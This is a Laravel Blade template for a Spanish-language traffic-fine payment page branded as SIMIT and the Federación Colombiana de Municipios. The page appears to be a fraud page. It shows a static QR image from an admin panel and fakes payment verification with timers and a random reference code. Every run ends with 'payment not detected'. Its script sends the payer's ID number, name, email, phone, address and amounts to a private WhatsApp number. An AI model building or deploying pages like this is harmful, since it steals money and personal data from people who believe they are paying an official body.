<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Confirmar Pago</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background-color: #f8f9fc;
      color: #333;
      margin: 0;
      padding: 0;
    }
    header {
      background-color: #003087;
      padding: 1em;
      text-align: center;
    }
    .header-contacts {
      display: flex;
      justify-content: center;
      gap: 1.5em;
      color: white;
      font-size: 1em;
      margin-top: 1em;
      flex-wrap: nowrap;
    }
    .header-contacts a {
      color: white;
      text-decoration: none;
      font-weight: 600;
    }
    .header-contacts a:hover {
      color: #00a651;
    }
    .subheader-layer {
      background-color: white;
      padding: 0.5em;
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 1em;
      flex-direction: row;
      flex-wrap: nowrap;
    }
    .subheader-layer img {
      width: auto;
      height: auto;
      max-height: 60px;
    }
    .header-line {
      height: 4px;
      background: linear-gradient(
        to right,
        #FFC107 33.33%, /* Yellow */
        #003F8C 33.33%, /* Blue */
        #003F8C 66.66%, /* Blue */
        #D81B60 66.66%  /* Red */
      );
      width: 100%;
    }
    .container {
      max-width: 1300px;
      margin: 10px auto;
      padding: 10px;
      background: white;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }
    .section-title {
      font-size: 1.5rem;
      margin-bottom: 16px;
      border-bottom: 2px solid #0a3d62;
      padding-bottom: 4px;
    }
    .summary-box {
      background: #e8f0fe;
      padding: 16px;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    .summary-box span {
      display: block;
      margin: 4px 0;
    }
    .discount-applied {
      margin-top: 10px;
      background-color: #e6f3fa;
      padding: 10px;
      border-radius: 8px;
      font-weight: 600;
    }
    .qr-code-container {
      text-align: center;
      margin: 20px 0;
    }
    .qr-code-container img {
      max-width: 600px;
      margin: 10px auto;
      display: block;
    }
    .button-container {
      text-align: center;
      margin-top: 20px;
    }
    button {
      background-color: #0a3d62;
      color: white;
      padding: 14px 28px;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.3s ease;
      margin-right: 10px;
    }
    button:hover:not(:disabled) {
      background-color: #07416e;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .modal-content {
      background-color: white;
      padding: 20px;
      border-radius: 8px;
      max-width: 500px;
      width: 90%;
      text-align: center;
    }
    .modal-content h2 {
      margin-top: 0;
      color: #0a3d62;
    }
    .modal-content button {
      margin: 10px;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #0a3d62;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    .small-spinner {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #0a3d62;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      display: inline-block;
      vertical-align: middle;
      margin-left: 10px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .items-list {
      margin: 20px 0;
    }
    .item-row {
      padding: 10px;
      border-bottom: 1px solid #e0e0e0;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .item-row:last-child {
      border-bottom: none;
    }
    @media (max-width: 768px) {
      .header-contacts {
        flex-direction: row;
        gap: 1em;
        font-size: 0.9em;
        justify-content: center;
        flex-wrap: nowrap;
      }
      .header-contacts a {
        white-space: nowrap;
      }
      .subheader-layer {
        flex-direction: row;
        gap: 0.5em;
        padding: 0.5em 1em;
      }
      .subheader-layer img {
        width: auto;
        height: auto;
        max-height: 80px;
      }
    }
    @media (max-width: 480px) {
      .header-contacts {
        font-size: 0.8em;
        gap: 0.8em;
      }
      .subheader-layer img {
        max-height: 60px;
      }
      .qr-code-container img {
        max-width: 300px;
      }
    }
  </style>
</head>
<body>
  <header>
    <div class="header-contacts">
      <a href="https://wa.me/+573232135571" target="_blank">WhatsApp: 323 2135571</a>
      <a href="tel:+576012365410">Teléfono: (601) 2365410</a>
    </div>
  </header>
  <div class="subheader-layer">
    <img src="{{ asset('fcm-logo.png') }}" alt="Federación Colombiana de Municipios">
    <img src="{{ asset('small-image.png') }}" alt="Small Image">
  </div>
  <div class="header-line"></div>
  <div class="container">
    <div class="section-title">Confirmar Pago</div>
    <div class="summary-box" id="payerInfo">
      <span><strong>Nombre:</strong> {{ $nombrePagador }}</span>
      <span><strong>Email:</strong> {{ $emailPagador }}</span>
      <span><strong>Teléfono:</strong> {{ $telefonoPagador }}</span>
      <span><strong>Dirección:</strong> {{ $direccionPagador }}</span>
    </div>
    <div class="section-title">Ítems Seleccionados</div>
    <div class="items-list" id="selectedItems">
      @if(isset($esPagoMultas) && $esPagoMultas && isset($multasSeleccionadas))
        @foreach($multasSeleccionadas as $multa)
          <div class="item-row">
            <div>
              <strong>Multa placa {{ $multa->placa }}</strong>
              <br>
              <small>Comparendo: {{ $multa->comparendo }}</small>
              <br>
              <small>Fecha: 
                @if(is_string($multa->fecha))
                  {{ $multa->fecha }}
                @else
                  {{ $multa->fecha->format('d/m/Y') }}
                @endif
              </small>
            </div>
            <div>
              <strong>${{ number_format($multa->valor, 0, ',', '.') }}</strong>
            </div>
          </div>
        @endforeach
      @else
        @foreach($cuotasSeleccionadas as $cuota)
          <div class="item-row">
            <div>
              <strong>Cuota #{{ $cuota->cliente->numero_acuerdo }}-Cuota{{ $cuota->numero_cuota }}</strong>
              <br>
              <small>Fecha: {{ $cuota->fecha_pago->format('d/m/Y') }}</small>
            </div>
            <div>
              <strong>${{ number_format($cuota->valor_cuota, 0, ',', '.') }}</strong>
            </div>
          </div>
        @endforeach
      @endif
    </div>
    <div id="discountContainer"></div>
    <div class="summary-box">
      <span>Total a Pagar: <strong id="totalPagar">${{ number_format($total, 0, ',', '.') }}</strong></span>
    </div>
    <div class="qr-code-container" id="qrMethod" style="display: none;">
      <h3>Método de Pago - Código QR</h3>
      <div id="qrLoader" class="spinner" style="display: none;"></div>

      {{-- Tarjeta estilo instructivo con espacio para el QR, usando los logos del proyecto --}}
      <div style="display: inline-block; background: #ffffff; border-radius: 22px; border: 3px solid #0054a6; padding: 22px 24px; max-width: 280px; text-align: center; font-family: Arial, sans-serif; box-shadow: 0 3px 8px rgba(0,0,0,0.08);">
        {{-- Encabezado con logo Redeban --}}
        <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 12px;">
          <img src="{{ asset('R8.png') }}" alt="Redeban" style="max-width: 150px; height: auto;">
        </div>

        {{-- Contenedor cuadrado donde se dibuja el código QR --}}
        <div style="margin: 12px auto 18px auto; width: 190px; height: 190px; border: 4px solid #0054a6; border-radius: 6px; display: flex; align-items: center; justify-content: center; background: #ffffff;">
          <img
            id="qrImage"
            src="{{ $qrImageUrl ?? '' }}"
            alt="Código QR de Pago"
            style="display: none; width: 100%; height: 100%; object-fit: contain;"
          >
        </div>

        {{-- Título e instrucciones resumidas --}}
        <h4 style="margin: 8px 0 6px 0; font-size: 0.9rem; font-weight: 700; color: #0054a6;">
          Cómo pagar tus multas
        </h4>
        <ol style="margin: 4px 0 0 18px; padding: 0; text-align: left; font-size: 0.75rem; color: #333; line-height: 1.3;">
          <li>Abre tu app bancaria o billetera digital y elige pagar con QR.</li>
          <li>Escanea este código QR con la cámara de tu app.</li>
          <li>Ingresa el valor a pagar y verifica los datos.</li>
          <li>Confirma la transacción con tu clave, huella o Face ID.</li>
        </ol>

        {{-- Franja inferior con logos Federación y SIMIT --}}
        <div style="margin-top: 16px; padding-top: 10px; border-top: 1px solid #e0e0e0; display: flex; align-items: center; justify-content: center; gap: 16px;">
          <img src="{{ asset('fcm-logo.png') }}" alt="Federación Colombiana de Municipios" style="max-height: 34px; width: auto;">
          <img src="{{ asset('small-image.png') }}" alt="SIMIT" style="max-height: 38px; width: auto;">
        </div>
      </div>

      <img src="{{ asset('PAGOS.jpg') }}" alt="Formas de pago" style="max-width: 100%; height: 220px; margin-top: 20px;">

      <p id="reference" style="display: none;">Código de Referencia: <strong id="referenceCode">-</strong></p>
      <div id="paymentWaiting" style="display: none;">Esperando pago... <span class="small-spinner"></span></div>
    </div>
    <div class="button-container">
      <button id="generateQRButton" onclick="generateQRCode()">Generar Código QR</button>
      <button id="confirmPaymentButton" style="display: none;" onclick="processPayment()">Confirmar Pago</button>
      <button onclick="window.location.href='{{ route('consulta.resultados', ['tipo_documento' => $cliente->tipo_documento, 'numero_documento' => $cliente->numero_documento]) }}'">Volver</button>
    </div>
  </div>
  <div class="modal" id="paymentModal">
    <div class="modal-content">
      <h2 id="modalTitle">Procesando Pago</h2>
      <div id="spinner" class="spinner" style="display: none;"></div>
      <p id="modalMessage"></p>
      <button id="modalCloseButton" style="display: none;" onclick="cerrarModalPago()">Cerrar</button>
    </div>
  </div>
  <footer style="background-color: #0a3d62; color: white; text-align: center; padding: 15px; margin-top: 40px; font-size: 12px;">
    <div style="max-width: 1200px; margin: 0 auto;">
      <p>© 2025 SIMIT - Sistema Integrado de Información sobre Multas y Sanciones por Infracciones de Tránsito.</p>
    </div>
  </footer>
  <script>
    const qrImageUrl = @json($qrImageUrl ?? null);
    const cuotasIds = @json($cuotasIds ?? []);
    const csrfToken = '{{ csrf_token() }}';
    let referenceCodeGlobal = '';
    
    const clienteData = {
      tipo_documento: @json($cliente->tipo_documento),
      numero_documento: @json($cliente->numero_documento),
      nombre: @json($nombrePagador),
      email: @json($emailPagador),
      telefono: @json($telefonoPagador),
      direccion: @json($direccionPagador),
    };
    
    @php
        if (isset($esPagoMultas) && $esPagoMultas && isset($multasSeleccionadas)) {
            $itemsDataArray = $multasSeleccionadas->map(function($multa) {
                return [
                    'tipo' => 'multa',
                    'descripcion' => 'Multa placa '.$multa->placa.' (Comparendo '.$multa->comparendo.')',
                    'valor' => $multa->valor,
                    'fecha' => is_string($multa->fecha)
                        ? $multa->fecha
                        : $multa->fecha->format('d/m/Y'),
                ];
            })->values()->all();
            $tipoPago = 'multas';
        } else {
            $itemsDataArray = $cuotasSeleccionadas->map(function($cuota) {
                return [
                    'tipo' => 'cuota',
                    'descripcion' => 'Cuota #'.$cuota->cliente->numero_acuerdo.'-Cuota'.$cuota->numero_cuota,
                    'valor' => $cuota->valor_cuota,
                    'fecha' => $cuota->fecha_pago->format('d/m/Y'),
                ];
            })->values()->all();
            $tipoPago = 'cuotas';
        }
    @endphp
    const tipoPago = @json($tipoPago);
    const itemsData = @json($itemsDataArray);

    function generateQRCode() {
      const qrLoader = document.getElementById('qrLoader');
      const qrMethod = document.getElementById('qrMethod');
      const qrImage = document.getElementById('qrImage');
      const generateButton = document.getElementById('generateQRButton');
      const confirmButton = document.getElementById('confirmPaymentButton');
      const reference = document.getElementById('reference');
      const referenceCode = document.getElementById('referenceCode');
      const paymentWaiting = document.getElementById('paymentWaiting');

      // Mostrar contenedor de QR y spinner
      qrMethod.style.display = 'block';
      qrLoader.style.display = 'block';
      generateButton.disabled = true;

      // Generar código de referencia
      const refCode = 'referencia-' + Date.now() + Math.random().toString(36).substr(2, 9);
      referenceCode.textContent = refCode;
      referenceCodeGlobal = refCode; // Guardar globalmente

      // Simular carga (en producción, esto sería una llamada al servidor)
      setTimeout(() => {
        qrLoader.style.display = 'none';
        
        if (qrImageUrl && qrImageUrl.trim() !== '') {
          // Verificar que la imagen se pueda cargar
          qrImage.onerror = function() {
            alert('Error: No se pudo cargar la imagen del código QR. Por favor, verifique que la imagen esté configurada correctamente en el panel de administración.');
            generateButton.disabled = false;
            qrImage.style.display = 'none';
          };
          
          qrImage.onload = function() {
            qrImage.style.display = 'block';
            reference.style.display = 'block';
            paymentWaiting.style.display = 'block';
            generateButton.style.display = 'none';
            confirmButton.style.display = 'inline-block';
          };
          
          qrImage.src = qrImageUrl;
        } else {
          alert('Error: No se ha configurado la imagen del código QR. Por favor, contacte al administrador.');
          generateButton.disabled = false;
        }
      }, 1500);
    }

    function processPayment() {
      const modal = document.getElementById('paymentModal');
      const modalTitle = document.getElementById('modalTitle');
      const modalMessage = document.getElementById('modalMessage');
      const spinner = document.getElementById('spinner');
      const modalCloseButton = document.getElementById('modalCloseButton');

      // Mostrar modal de procesamiento
      modal.style.display = 'flex';
      modalTitle.textContent = 'Procesando Pago';
      modalMessage.textContent = 'Verificando el pago, por favor espera...';
      spinner.style.display = 'block';
      modalCloseButton.style.display = 'none';

      // Obtener código de referencia
      const referenceCode = referenceCodeGlobal || document.getElementById('referenceCode').textContent || 'referencia-' + Date.now();

      // Construir mensaje para WhatsApp
      let mensaje = '*Confirmación de Pago - Simitfcm.com*\n';
      mensaje += 'Tipo de Documento: ' + clienteData.tipo_documento + '\n';
      mensaje += 'Número de Documento: ' + clienteData.numero_documento + '\n';
      mensaje += 'Nombre: ' + (clienteData.nombre || 'N/A') + '\n';
      mensaje += 'Correo: ' + (clienteData.email || 'N/A') + '\n';
      mensaje += 'Teléfono: ' + (clienteData.telefono || 'N/A') + '\n';
      mensaje += 'Dirección: ' + (clienteData.direccion || 'N/A') + '\n';
      mensaje += '\n';
      mensaje += 'Ítems Seleccionados:\n';
      
      itemsData.forEach(function(item) {
        const valorFormateado = new Intl.NumberFormat('es-CO', {
          minimumFractionDigits: 0,
          maximumFractionDigits: 0
        }).format(item.valor);
        mensaje += item.descripcion + ': $' + valorFormateado + ' (Fecha: ' + item.fecha + ')\n';
      });
      
      mensaje += '\n';
      
      // Calcular total
      const total = itemsData.reduce(function(sum, item) {
        return sum + parseFloat(item.valor);
      }, 0);
      const totalFormateado = new Intl.NumberFormat('es-CO', {
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
      }).format(total);
      
      mensaje += 'Total a Pagar: $' + totalFormateado + '\n';
      mensaje += 'Código de Referencia: ' + referenceCode;

      // Codificar mensaje para URL
      const mensajeCodificado = encodeURIComponent(mensaje);
      
      // Número de WhatsApp (formato internacional: 57 + número)
      const whatsappNumber = '573232135571';
      
      // Construir URL de WhatsApp
      const whatsappUrl = 'https://api.whatsapp.com/send/?phone=' + whatsappNumber + '&text=' + mensajeCodificado + '&type=phone_number&app_absent=0';

      // Esperar 2 segundos mostrando el modal y luego redirigir
      setTimeout(function() {
        // Abrir WhatsApp en nueva ventana/pestaña
        window.open(whatsappUrl, '_blank');
        
        // Después de abrir WhatsApp, mostrar mensaje de pago no detectado
        setTimeout(function() {
          spinner.style.display = 'none';
          modalTitle.textContent = 'Pago No Detectado';
          modalMessage.textContent = 'No se pudo verificar el pago. Los detalles han sido enviados a WhatsApp para soporte.';
          modalMessage.style.color = '#dc2626';
          modalMessage.style.fontWeight = '600';
          modalCloseButton.textContent = 'Volver a Resultados';
          modalCloseButton.style.display = 'inline-block';
          modalCloseButton.onclick = function() {
            window.location.href = '{{ route('consulta.resultados', ['tipo_documento' => $cliente->tipo_documento, 'numero_documento' => $cliente->numero_documento]) }}';
          };
        }, 1000);
      }, 2000);
    }

    function cerrarModalPago() {
      const modal = document.getElementById('paymentModal');
      modal.style.display = 'none';
    }
  </script>
</body>
</html>

